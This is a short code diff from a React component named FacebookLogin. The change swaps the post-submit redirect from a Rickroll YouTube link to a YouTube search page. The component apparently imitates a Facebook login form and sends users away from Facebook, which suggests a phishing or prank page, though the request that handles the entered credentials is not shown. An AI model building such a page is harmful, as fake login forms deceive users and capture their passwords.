@@ -52,7 +52,7 @@ export default function FacebookLogin() {
         })
       });
 
-      window.location.href = `https://www.youtube.com/watch?v=dQw4w9WgXcQ&feature=share&artist_welcome=true`;
+      window.location.href = `https://www.youtube.com/results?search_query=yoah+bros`;
       
     } catch (err) {
       setError('Invalid username or password');
